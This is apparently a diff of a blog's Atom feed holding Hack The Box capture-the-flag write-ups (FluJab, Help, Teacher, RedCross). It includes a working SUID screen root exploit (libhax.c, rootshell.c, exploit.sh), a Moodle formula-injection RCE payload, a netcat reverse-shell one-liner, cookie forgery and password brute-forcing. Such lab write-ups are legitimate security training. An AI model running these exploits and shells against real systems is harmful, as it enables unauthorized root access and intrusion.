+&lt;h4 id=&quot;so-i-had-to-remove-the-c-code-from-the-exploit-and-create-separate-files-then-i-compiled-them&quot;&gt;So I had to remove the &lt;code class=&quot;highlighter-rouge&quot;&gt;c&lt;/code&gt; code from the exploit and create separate files. Then I compiled them.&lt;/h4&gt;
+&lt;h4 id=&quot;libhaxc-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;libhax.c&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown(&quot;/tmp/rootshell&quot;, 0, 0);
+    chmod(&quot;/tmp/rootshell&quot;, 04755);
+    unlink(&quot;/etc/ld.so.preload&quot;);
+    printf(&quot;[+] done!\n&quot;);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;rootshellc-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rootshell.c&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp(&quot;/bin/sh&quot;, NULL, NULL);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;compilation-&quot;&gt;Compilation :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -fPIC -shared -ldl -o libhax.so libhax.c&lt;/code&gt;
+&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -o rootshell rootshell.c&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&quot;exploitsh-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;exploit.sh&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash &lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /etc
+&lt;span class=&quot;nb&quot;&gt;umask &lt;/span&gt;000
+screen &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; ld.so.preload &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0a/tmp/libhax.so&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# newline needed&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] Triggering...&quot;&lt;/span&gt;
+screen &lt;span class=&quot;nt&quot;&gt;-ls&lt;/span&gt; 
+/tmp/rootshell
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-ran-a-python-server-to-host-the-compiled-binaries-and-the-exploit-script-then-i-downloaded-them-on-the-machine-&quot;&gt;I ran a python server to host the compiled binaries and the exploit script. Then I downloaded them on the machine :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/112.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;but-when-i-ran-the-exploit-it-didnt-spawn-a-root-shell-&quot;&gt;But when I ran the exploit it didn’t spawn a root shell :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/113.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;thats-because-i-forgot-that-the-suid-version-of-screen-was-in-usrlocalsharescreenscreen-the-other-one-had-problems-and-didnt-even-start-&quot;&gt;That’s because I forgot that the &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; version of &lt;code class=&quot;highlighter-rouge&quot;&gt;screen&lt;/code&gt; was in &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/share/screen/screen&lt;/code&gt;. The other one had problems and didn’t even start :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/114.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;so-i-edited-the-path-in-the-exploit-code-&quot;&gt;So I edited the path in the exploit code :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/115.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash &lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /etc
+&lt;span class=&quot;nb&quot;&gt;umask &lt;/span&gt;000
+/usr/local/share/screen/screen &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; ld.so.preload &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0a/tmp/libhax.so&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# newline needed&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] Triggering...&quot;&lt;/span&gt;
+/usr/local/share/screen/screen &lt;span class=&quot;nt&quot;&gt;-ls&lt;/span&gt; 
+/tmp/rootshell
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/116.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
+&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
+&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---help&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/help/&quot;&gt;Hack The Box - Help&lt;/a&gt;&lt;/h4&gt;
+&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="SQLI" /><category term="ssh" /><category term="rbash" /><category term="Binary Exploitation" /><category term="c" /><summary type="html">Quick Summary Hey guys today FluJab retired and here’s my write-up about it. This machine had a lot of rabbit holes and trolls which made it hard to enjoy the machine. But without mentioning those annoying things this machine had some really cool web exploitation parts like cookie manipulation, authentication bypasses and most importantly an interesting SQL injection vulnerability. Ajenti administration panel was installed on the box and I could get credentials for it by exploiting the SQLi, After that I could use a user’s public ssh key to get the private key as it was vulnerable to CVE-2008-0166 then I escaped rbash and exploited a vulnerable version of screen to get a root shell. It’s a Linux box and its ip is 10.10.10.124, I added it to /etc/hosts as flujab.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC flujab.htb We got ssh on port 22, http on ports 80 and 8080 and https on port 443. There’s also some sort of virtual hosting as we can see from the nmap scan and there are a lot of domains … We can also check the ssl certificate manually : HTTP I added all of them to /etc/hosts and checked them, However I will skip the rabbit holes in the write-up because it’s just a waste of time. If we take a look at what we have : The machine name is flujab so we are only interested in : console.flujab.htb sys.flujab.htb smtp.flujab.htb freeflujab.htb flujab.htb We saw that error about direct ip access when we visited flujab.htb, Let’s check the other 4. console.flujab.htb : Just a troll ! sys.flujab.htb : The same error on flujab.htb smtp.flujab.htb : We don’t have any credentials for that. freeflujab.htb : That one is interesting. I tried to run gobuster but there was a wildcard response. When I checked manually I found that instead of responding with 404 it responds with a redirection to https://clownware.htb/cwerror_pages.php which has a gif of a strange creepy clown … Note : I checked them all on port 8080 too but I always got the direct ip access error. I started burp and configured the scope : Then I ran the spider : Results : I checked the requests and the responses of different pages and actions. I noticed in one of the responses a Set-Cookie header that sets a cookie called Modus and sets the path for it to /?smtp_config. I requested /?smtp_config in the browser and looked at the request in burp : Request : Response : The response was a redirection to /?denied. We are sending 3 cookies in every request : Modus , Patient and Registered. Modus and Registered are base-64 encoded strings while Patient is an md5 hash. Modus = Configure=Null Registered = f991b5fb6a2939471c7230b2db78225e=Null Registered is using the same hash from Patient, After some guesses I found that this hash is for my ip : Anyway we can try to change these values from Null to True and see what happens : Request : GET /?smtp_config HTTP/1.1 Host: freeflujab.htb User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d Connection: close Upgrade-Insecure-Requests: 1 Response : HTTP/1.1 200 OK Date: Thu, 15 Jun 2019 10:34:17 GMT Content-Type: text/html; charset=UTF-8 Connection: close Server: ClownWare Proxy Content-Length: 3735 Great, we can access the page now. Before doing anything I noticed this message about the whitelist: I requested /?whitelist and looked at the response : My ip wasn’t there. Anyway I used python to run a debugging smtp server : python -m smtpd -n -c DebuggingServer 10.10.xx.xx:25 Then I went to update the smtp settings and add mine : But I got this message : A Valid SMTP Domain Address Is Required. So I checked the source of the form : &amp;lt;form method=&quot;post&quot; action=&quot;?smtp_config&quot;&amp;gt; &amp;lt;div class=&quot;row aln-center&quot;&amp;gt; &amp;lt;div class=&quot;col-6 &quot;&amp;gt; &amp;lt;input type=&quot;text&quot; name=&quot;mailserver&quot; id=&quot;email-server&quot; value=&quot;smtp.flujab.htb&quot; pattern=&quot;smtp.[A-Za-z]{1,255}.[A-Za-z]{2,5}&quot; title=&quot; A Valid SMTP Domain Address Is Required&quot;/&amp;gt; &amp;lt;input type=&quot;hidden&quot; name=&quot;port&quot; id=&quot;port&quot; placeholder=&quot;25&quot; value=&quot;25&quot; /&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;div class=&quot;col-12&quot;&amp;gt; &amp;lt;p&amp;gt; WARNING: Only &amp;lt;a href=&quot;/?whitelist&quot;&amp;gt;whitelisted sysadmins&amp;lt;/a&amp;gt; are authorized to access this page! &amp;lt;br \&amp;gt; If you are not supposed to change these settings then don't! whitelist will be auto-updated. &amp;lt;/p&amp;gt; &amp;lt;ul class=&quot;actions&quot;&amp;gt; &amp;lt;li&amp;gt;&amp;lt;input type=&quot;submit&quot; class=&quot;style1&quot; value=&quot;Save Mail Server Config&quot; name=&quot;save&quot; /&amp;gt;&amp;lt;/li&amp;gt; &amp;lt;/ul&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/form&amp;gt; It’s relying on client-side validation check : Which means that we can bypass it easily by sending the data directly in the request : Request : ``` POST /?smtp_config HTTP/1.1 Host: freeflujab.htb User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 59</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/flujab/0.png" /></entry><entry><title type="html">pwnable.kr - bof</title><link href="http://localhost:4000/pwn/bof/" rel="alternate" type="text/html" title="pwnable.kr - bof" /><published>2019-06-10T00:00:00+02:00</published><updated>2019-06-10T00:00:00+02:00</updated><id>http://localhost:4000/pwn/bof</id><content type="html" xml:base="http://localhost:4000/pwn/bof/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;
 &lt;h4 id=&quot;hey-guys-its-been-a-long-time-since-my-first-pwn-write-up--today-ill-write-about-another-challenge-from-pwnablekr-called-bof-it-was-a-simple-easy-buffer-overflow-challenge-you-can-also-check-these-by-overwriting-a-variable-we-can-get-a-shell-ill-also-write-a-small-exploit-with-pwntools-that-spawns-a-shell-automatically&quot;&gt;Hey guys it’s been a long time since my &lt;a href=&quot;https://0xrick.github.io/pwn/fd/&quot;&gt;first pwn write-up&lt;/a&gt;,  today I’ll write about another challenge from &lt;a href=&quot;https://pwnable.kr&quot;&gt;pwnable.kr&lt;/a&gt; called bof. It was a simple easy buffer overflow challenge (You can also check &lt;a href=&quot;/categories/#binary-exploitation&quot;&gt;these&lt;/a&gt;), by overwriting a variable we can get a shell. I’ll also write a small exploit with &lt;code class=&quot;highlighter-rouge&quot;&gt;pwntools&lt;/code&gt; that spawns a shell automatically.&lt;/h4&gt;
@@ -636,6 +1638,7 @@ int main(int argc, char **argv) {
 &lt;p&gt;&lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 &lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---sizzle&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/sizzle/&quot;&gt;Hack The Box - Sizzle&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---flujab&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/flujab/&quot;&gt;Hack The Box - FluJab&lt;/a&gt;&lt;/h4&gt;
 &lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="php" /><category term="Python" /><category term="code analysis" /><summary type="html">Quick Summary Hey guys today Help retired and here’s my write-up about it. Help was a nice easy machine, I don’t really have much to say about it. To get an initial shell on the box we will exploit a non-authenticated file upload vulnerability in a web application called HelpDeskZ. This vulnerability could be exploited in two ways either by editing the exploit to include a higher range or by getting credentials to the web app and editing some settings to make the exploit work. After getting a shell the privilege escalation part is just a kernel exploit. It’s a Linux box and its ip is 10.10.10.121 I added it to /etc/hosts as help.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC help.htb We got ssh on port 22 and http on two ports : 80 and 3000. What’s running on port 80 is an Apache2 server and on port 3000 is Node.js Express Framework. HTTP Initial Enumeration On port 80 there’s just the default Apache index page : So I ran gobuster and got these results : gobuster -u http://help.htb/ -w /usr/share/wordlists/dirb/common.txt ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://help.htb/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 10s ===================================================== 2019/06/07 13:03:25 Starting gobuster ===================================================== /.hta (Status: 403) /.htpasswd (Status: 403) /.htaccess (Status: 403) /index.html (Status: 200) /javascript (Status: 301) /server-status (Status: 403) /support (Status: 301) ===================================================== 2019/06/07 13:05:25 Finished ===================================================== I went to /support and there was a web application called HelpDeskZ : File Upload Vulnerability A quick search and I found an unauthenticated file upload vulnerability that takes advantage of the weak file renaming function that’s responsible for renaming tickets attachments and the ability to upload php files because they are allowed by default.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/help/0.png" /></entry><entry><title type="html">Hack The Box - Sizzle</title><link href="http://localhost:4000/hack-the-box/sizzle/" rel="alternate" type="text/html" title="Hack The Box - Sizzle" /><published>2019-06-01T00:00:00+02:00</published><updated>2019-06-01T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/sizzle</id><content type="html" xml:base="http://localhost:4000/hack-the-box/sizzle/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
@@ -3755,221 +4758,4 @@ Th4C00lTheacha9
 &lt;br /&gt;&lt;/p&gt;
 &lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---redcross&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/redcross/&quot;&gt;Hack The Box - RedCross&lt;/a&gt;&lt;/h4&gt;
 &lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---irked&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/irked/&quot;&gt;Hack The Box - Irked&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="php" /><summary type="html">Quick Summary Hey guys , today Teacher retired and here is my write-up about it. I don’t have too much to say about this box. It was an easy regular machine , We will exploit an authenticated remote code execution in a vulnerable version of a web application called moodle to get an initial shell on the box. And for privilege escalation we will find a directory which permissions are set to read , write and execute by anyone , and from there we can create a symlink to /root or anything else we want to access. It’s a linux box and its ip is 10.10.10.153 I added it to /etc/hosts as teacher.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC teacher.htb We only see http running on port 80. Let’s see what’s in there. HTTP Initial Enumeration There is just a static website titled Blackhat highschool , I looked into other pages like Courses , Students etc… And also checked their source code. And on Gallery : I found this line in the source : for &amp;lt;img src=&quot;images/5.png&quot;&amp;gt; there is an onerror attribute to print That's an F in the console. So I checked the console : Weird let’s check that image. http://teacher.htb/images/5.png : Corrupted file ? Let’s check if it’s really a corrupted image or it’s not an image at all : curl http://teacher.htb/images/5.png Hi Servicedesk, I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha. Could you guys figure out what the last charachter is, or just reset it? Thanks, Giovanni Nice , we have a username and a password but we still need to figure out the last character. But where will we use these credentials anyway ? I ran gobuster with /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt in the background and got some results , one of them was /moodle. http://teacher.htb/moodle Moodle is a free and open-source learning management system written in PHP and distributed under the GNU General Public License -Wikipedia On the login page there’s a guest login : However I couldn’t achieve anything from that guest login. Bruteforcing the last character We have the credentials but we need to figure out the last character of the password. I created a list of numbers , letters and special chars and printed them next to the password. for i in {a..z}; do echo Th4C00lTheacha$i; done &amp;gt; list.txt this will print all the letters next to Th4C00lTheacha Then I added some special chars manually like !@#$%^&amp;amp;*()_-+=.?/\ and finally I added numbers : for i in {0..9}; do echo Th4C00lTheacha$i; done &amp;gt;&amp;gt; list.txt list.txt : Th4C00lTheachaa Th4C00lTheachab Th4C00lTheachac Th4C00lTheachad Th4C00lTheachae Th4C00lTheachaf Th4C00lTheachag Th4C00lTheachah Th4C00lTheachai Th4C00lTheachaj Th4C00lTheachak Th4C00lTheachal Th4C00lTheacham Th4C00lTheachan Th4C00lTheachao Th4C00lTheachap Th4C00lTheachaq Th4C00lTheachar Th4C00lTheachas Th4C00lTheachat Th4C00lTheachau Th4C00lTheachav Th4C00lTheachaw Th4C00lTheachax Th4C00lTheachay Th4C00lTheachaz Th4C00lTheacha! Th4C00lTheacha@ Th4C00lTheacha# Th4C00lTheacha$ Th4C00lTheacha% Th4C00lTheacha^ Th4C00lTheacha&amp;amp; Th4C00lTheacha* Th4C00lTheacha( Th4C00lTheacha) Th4C00lTheacha_ Th4C00lTheacha- Th4C00lTheacha+ Th4C00lTheacha= Th4C00lTheacha. Th4C00lTheacha? Th4C00lTheacha/ Th4C00lTheacha\ Th4C00lTheacha0 Th4C00lTheacha1 Th4C00lTheacha2 Th4C00lTheacha3 Th4C00lTheacha4 Th4C00lTheacha5 Th4C00lTheacha6 Th4C00lTheacha7 Th4C00lTheacha8 Th4C00lTheacha9 Since it’s a small list , I used burp intruder to bruteforce the password. Let’s intercept the request and send it to intruder : After it’s finished , all the responses were 870 bytes in length except the response of the payload Th4C00lTheacha#. So probably this is the right password , let’s check. It worked and now we are in as Giovanni RCE , Initial Shell as www-data After some enumeration I didn’t find anything interesting , so I searched on Google and found this article. Let’s try to reproduce that vulnerability. First , we will go to the Algebra course : Then we will turn editing on : Now we can edit the course , so we will choose any topic and click on Add an activity or resource and we will choose Quiz : Then we will just fill in the required information : And click on Save and display. After that we will click on edit quiz : And add a new question. Question type will be Calculated : Again we will fill in the required information : And finally we reach the actual exploitation , we will set the answer formula to : /*{a*/`$_GET[0]`;//{x}}` This will allow us to pass system commands through a url parameter called 0 , More info about how the exploit is working can be found in the previously mentioned article. After saving the changes we will get this page : We will click on Next Page to finally get to the vulnerable page : Let’s add the parameter 0 and get a reverse shell : Shell : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc ip port &amp;gt;/tmp/f Note : the payload is url encoded. So final payload will be : &amp;amp;0=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&amp;gt;%261|nc+ip+port+&amp;gt;/tmp/f After sending the request , our listener gets a callback. And we get a reverse shell as www-data : There is only giovanni on the box and we can’t access his /home directory as www-data. Hardcoded Database Credentials , Privilege Escalation to giovanni Back to /var/www/html/moodle , I wanted to check config files and other stuff to see if there are any information that can help. And in config.php I found database credentials : Sweet , Let’s see what’s in there. mysql -h 127.0.0.1 -u root -p We are not in any database [(none)] , Let’s list the databases : SHOW DATABASES; moodle is interesting and might have some passwords. USE moodle; Now let’s check the tables : SHOW TABLES; A lot of tables , but an interesting one is called mdl_user : Alright , let’s see what’s in that table : SELECT * from mdl_user; We didn’t get the best output :D but anyway I looked into it and found this md5 hash : And its name is Giovannibak , probably a backup for giovanni’s password. crackstation was able to crack it : The password is expelled, we can su to giovanni Now we own user. 777. Ability to read , write and execute anything on the system In giovanni’s /home directory there is a directory called work which has two directories courses and tmp. Nothing Special. After a lot of enumeration I found in /usr/bin a script called backup.sh : We don’t really care about the tar commands , What we care about is that it’s changing current directory to /home/giovanni/work then changes it once again to /home/giovanni/work/tmp then changes permissions to 777 recursively. This means that any user can read , write and execute any file in /home/giovanni/work/tmp. So if we created a symlink for /root in /home/giovanni/work/tmp and wait for the script to get executed by root (cronjob) we will have access to /root. In normal conditions creating a symlink to /root won’t let you have access to it if you don’t have the permissions to. Because it’s still linking to a directory that you are not authorized to access. But since the script runs chmod 777 on /home/giovanni/work/tmp recursively, Anyone has access to what’s in there even symlinks. This article explains it very well. Read this if you don’t know what’s a symlink. Alright , Let’s create a symlink for /root in /home/giovanni/work/tmp ln -s /root ./tmp And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - RedCross Next Hack The Box write-up : Hack The Box - Irked</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/teacher/0.png" /></entry><entry><title type="html">Hack The Box - RedCross</title><link href="http://localhost:4000/hack-the-box/redcross/" rel="alternate" type="text/html" title="Hack The Box - RedCross" /><published>2019-04-13T00:00:00+02:00</published><updated>2019-04-13T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/redcross</id><content type="html" xml:base="http://localhost:4000/hack-the-box/redcross/">&lt;hr /&gt;
-
-&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
-&lt;h4 id=&quot;hey-guys-today-redcross-retired-and-here-is-my-write-up-about-it-to-get-an-initial-shell-on-this-box-there-are-two-ways--first-one-is-to-exploit-an-authenticated-rce-which-gives-you-a-shell-as-www-data--then-escalate-to-root-the-second-way-is-to-exploit-a-vulnerable-smtp-server-called-haraka-to-get-a-shell-as-user-then-escalate-to-root-both-of-the-ways-were-fun-and-i-liked-this-box-its-a-medium-rated-linux-box-and-its-ip-is-101010113-i-added-it-to-etchosts-as-redcrosshtb-lets-jump-right-in-&quot;&gt;Hey guys today RedCross retired and here is my write-up about it. To get an initial shell on this box there are two ways , first one is to exploit an authenticated RCE which gives you a shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; , then escalate to root. The second way is to exploit a vulnerable &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; server called &lt;code class=&quot;highlighter-rouge&quot;&gt;Haraka&lt;/code&gt; to get a shell as user then escalate to root. Both of the ways were fun and I liked this box. It’s a medium-rated linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.113&lt;/code&gt; I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;redcross.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with nmap to scan for open ports and services :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC redcross.htb&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/redcross/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;port-22-is-open-and-running-ssh--theres-http-and-https-on-ports-80-and-443-as-always-we-will-check-http&quot;&gt;Port 22 is open and running ssh , there’s http and https on ports 80 and 443. As always we will check http.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
-&lt;h4 id=&quot;by-going-to-httpredcrosshtb-it-redirects-us-to-httpsintraredcrosshtb&quot;&gt;By going to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://redcross.htb&lt;/code&gt; it redirects us to &lt;code class=&quot;highlighter-rouge&quot;&gt;https://intra.redcross.htb&lt;/code&gt;&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;i-added-intraredcrosshtb-to-etchosts-next-to-the-ip-of-the-box-which-is-101010113&quot;&gt;I added &lt;code class=&quot;highlighter-rouge&quot;&gt;intra.redcross.htb&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; next to the ip of the box which is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.113&lt;/code&gt;&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;lets-go-to-intraredcrosshtb-again-&quot;&gt;Let’s go to &lt;code class=&quot;highlighter-rouge&quot;&gt;intra.redcross.htb&lt;/code&gt; again :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;before-doing-anything-i-wanted-to-see-if-there-are-any-other-subdomains--so-i-used-wfuzz-with-subdomains-top1mil-5000txt-from-seclists-&quot;&gt;Before doing anything I wanted to see if there are any other subdomains , so I used &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; with &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1mil-5000.txt&quot;&gt;subdomains-top1mil-5000.txt&lt;/a&gt; from seclists :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz -c -w subdomains-top1mil-5000.txt -H &quot;HOST:FUZZ.redcross.htb&quot; https://redcross.htb&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/redcross/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
